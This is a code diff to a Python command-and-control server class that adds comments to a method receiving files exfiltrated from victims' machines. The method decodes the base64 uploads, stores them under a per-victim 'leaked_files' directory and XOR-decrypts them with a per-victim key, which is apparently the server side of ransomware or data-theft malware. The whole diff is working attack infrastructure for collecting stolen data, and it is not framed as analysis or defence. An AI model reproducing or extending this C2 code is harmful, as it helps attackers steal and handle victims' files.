@@ -55,31 +55,38 @@ class CNC(CNCBase):
         return {"status":"OK"}
 
     def post_file(self, path: str, params: dict, body: dict) -> dict:
+        # function to handle post request of files
         self._log.debug(path)
         self._log.debug(params)
         self._log.debug(body)
 
+
         label = params['label']
         file_name = body['file_name']
         file_data = body['file_data']
+        # the file data is sent as base 64, so we have to decode it
         file_data = base64.b64decode(file_data)
 
+        # creating paths for cleaner code
         key_path = f"{CNC.ROOT_PATH}/{label}/key.bin"
         new_path = f"{CNC.ROOT_PATH}/{label}/leaked_files"
         file_path = f"{new_path}/{file_name}"
         
+        # making a new directory if needed, corresponding to the victim's machine
         if not Path(new_path).exists():
             Path(new_path).mkdir(parents=True, exist_ok=False)
-
+        
+        # reading key, saved locally beforehand
         with open(key_path, 'rb') as key_file:
             key = key_file.read()
             self._log.debug(key)
 
-        # file_path = f"{new_path}/{file_name}.bin"
+        # writing the data of the received file
         with open(file_path, "wb") as data_file:
             # bin_data is written into data_file
             data_file.write(file_data)
 
+        # decrypting the received file
         xorfile(file_path, key)
 
         return {"status":"OK"}
